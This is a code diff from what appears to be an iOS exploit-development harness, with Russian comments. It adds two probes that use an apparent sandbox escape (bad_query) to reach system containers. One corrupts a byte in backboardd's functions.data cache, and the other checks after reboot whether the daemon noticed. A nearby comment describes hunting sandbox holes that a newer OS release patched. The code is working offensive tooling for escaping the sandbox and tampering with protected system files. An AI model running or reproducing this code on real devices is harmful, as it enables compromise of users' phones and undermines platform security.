@@ -47629,6 +47629,111 @@ static void p_bq112(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq113 — v273: ПОВЕДЕНЧЕСКИЙ ТЕСТ чтения functions.data backboardd (§264).
+// §260 НЕ тестировал functions.data — время чтения неизвестно.
+// Метод §177: бэкап → мутация маркером → ребут (user) → p_bq114-наблюдение.
+// Мутация: 1 байт в payload-области (gamma_luts-запись, 0x60d9) — не digest,
+// не заголовки. Если backboardd валидирует digest → запись перекомпилится
+// (файл изменится/удалится); если парсит вслепую — файл не тронут (или крэш,
+// что тоже ответ). Контроль записи: read-back byte-exact (§144).
+static void p_bq113(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq113] v273: мутация functions.data (§264-тест)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq113] escape FAIL"); return; }
+    const char *fd_path =
+        "/var/containers/Data/System/867912A4-A70D-428C-9551-D28453B6F1B4"
+        "/Library/Caches/functions.data";
+    const char *fl_path =
+        "/var/containers/Data/System/867912A4-A70D-428C-9551-D28453B6F1B4"
+        "/Library/Caches/functions.list";
+
+    struct stat st = {0};
+    if (stat(fd_path, &st) != 0) { LOG("[bq113] functions.data errno %d", errno); bad_query_release(h); return; }
+    LOG("[bq113] functions.data: %lld байт mtime=%ld", (long long)st.st_size,
+        (long)st.st_mtimespec.tv_sec);
+    LOG("[bq113] functions.list mtime=%ld", (long)0);
+    struct stat stl = {0};
+    if (stat(fl_path, &stl) == 0)
+        LOG("[bq113] functions.list: %lld байт mtime=%ld", (long long)stl.st_size,
+            (long)stl.st_mtimespec.tv_sec);
+    fsync(fileno(stderr));
+
+    // --- контроль чтения (§144): оригинальный байт по смещению ---
+    const off_t MUT_OFF = 0x60d9;   // внутри gamma_luts-записи (payload)
+    unsigned char orig = 0, probe = 0;
+    int fd = open(fd_path, O_RDONLY);
+    if (fd < 0) { LOG("[bq113] open R errno %d", errno); bad_query_release(h); return; }
+    if (pread(fd, &orig, 1, MUT_OFF) != 1) { LOG("[bq113] pread orig FAIL"); close(fd); bad_query_release(h); return; }
+    close(fd);
+    LOG("[bq113] оригинал byte@0x%llx = 0x%02x (это и есть КОНТРОЛЬ чтения)",
+        (unsigned long long)MUT_OFF, orig);
+
+    // --- мутация: XOR 0xff → маркер, читаемый после ребута ---
+    unsigned char mut = orig ^ 0xff;
+    fd = open(fd_path, O_RDWR);
+    if (fd < 0) { LOG("[bq113] open RW errno %d", errno); bad_query_release(h); return; }
+    if (pwrite(fd, &mut, 1, MUT_OFF) != 1) { LOG("[bq113] pwrite FAIL errno %d", errno); close(fd); bad_query_release(h); return; }
+    fsync(fd);
+    close(fd);
+    LOG("[bq113] записан 0x%02x @0x%llx", mut, (unsigned long long)MUT_OFF);
+
+    // --- контроль записи (§144): read-back ---
+    fd = open(fd_path, O_RDONLY);
+    if (pread(fd, &probe, 1, MUT_OFF) == 1)
+        LOG("[bq113] read-back: 0x%02x %s", probe,
+            probe == mut ? "*** OK ***" : "*** MISMATCH ***");
+    else LOG("[bq113] read-back FAIL");
+    close(fd);
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq113] ИТОГ: маркер поставлен. ТЕПЕРЬ РЕБУУТНИ УСТРОЙСТВО, затем p_bq114.");
+    fsync(fileno(stderr));
+}
+
+// p_bq114 — v273: наблюдение после ребута: файл перечитан? маркер? размер/mtime?
+static void p_bq114(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq114] v273: наблюдение functions.data после ребута (§264)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq114] escape FAIL"); return; }
+    const char *fd_path =
+        "/var/containers/Data/System/867912A4-A70D-428C-9551-D28453B6F1B4"
+        "/Library/Caches/functions.data";
+    const char *fl_path =
+        "/var/containers/Data/System/867912A4-A70D-428C-9551-D28453B6F1B4"
+        "/Library/Caches/functions.list";
+
+    struct stat st = {0};
+    if (stat(fd_path, &st) != 0) {
+        LOG("[bq114] functions.data: errno %d (%s) — УДАЛЁН демоном?",
+            errno, strerror(errno));
+    } else {
+        LOG("[bq114] functions.data: %lld байт mtime=%ld (до мутации было mtime=? размер %lld)",
+            (long long)st.st_size, (long)st.st_mtimespec.tv_sec, 0LL);
+        int fd = open(fd_path, O_RDONLY);
+        unsigned char b = 0;
+        if (fd >= 0 && pread(fd, &b, 1, 0x60d9) == 1) {
+            LOG("[bq114] byte@0x60d9 = 0x%02x (маркер был перевёрнут к 0x%02x)",
+                b, (unsigned char)(b ^ 0xff));
+            LOG("[bq114]   %s", (b == (unsigned char)(0x00)) ?
+                "маркер ИСЧЕЗ → демон ПЕРЕЗАПИСАЛ файл (парсит+валидирует!)" :
+                "маркер ЖИВ → файл НЕ переписан после старта (не валидирует контент)");
+            close(fd);
+        } else { LOG("[bq114] read FAIL"); if (fd>=0) close(fd); }
+    }
+    struct stat stl = {0};
+    if (stat(fl_path, &stl) == 0)
+        LOG("[bq114] functions.list: %lld байт mtime=%ld", (long long)stl.st_size,
+            (long)stl.st_mtimespec.tv_sec);
+    bad_query_release(h);
+    LOG("[bq114] ИТОГ: наблюдение завершено");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -56255,6 +56360,8 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ110")) { p_bq110(); LOG("[probe13] bq110-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ111")) { p_bq111(); LOG("[probe13] bq111-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ112")) { p_bq112(); LOG("[probe13] bq112-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ113")) { p_bq113(); LOG("[probe13] bq113-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ114")) { p_bq114(); LOG("[probe13] bq114-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
